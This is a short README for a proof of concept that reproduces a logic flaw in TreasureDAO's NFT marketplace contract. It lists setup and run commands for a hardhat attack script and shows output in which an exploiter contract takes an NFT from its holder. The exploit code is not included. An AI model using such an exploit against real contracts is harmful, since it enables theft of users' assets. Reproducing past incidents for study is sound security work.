# TreasureDAO's Logic Issue PoC

## How to run

Set up the environment variable for $ALCHEMY_KEY

```
$  git clone https://github.com/SupremacyCA/Web3.0-Rekt
$  export $ALCHEMY_KEY = xxxxx
$  cd ./TreasureDAO
$  yarn

then 

$  sh run.sh
```

```
$  sh run.sh
yarn run v1.22.18
warning package.json: No license field
$ /Users/jehovah/Projects/PoCs/Web3.0-Rekt/NFT/TreasureDAO/node_modules/.bin/hardhat run scripts/attack.js
Compiled 4 Solidity files successfully
[#] 🧛 Exploiter deployed to: 0x5FC8d32690cc91D4c39d9d3abcBD16989F875707
[#] 🧛 The holder of the NFT before the attack was:  0xd3FeeDc8E702A9F191737c0482b685b74Be48CFa
[#] 🧛 The holder of the NFT after the attack was:  0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 [#] Hacker
✨  Done in 37.25s.
```

---
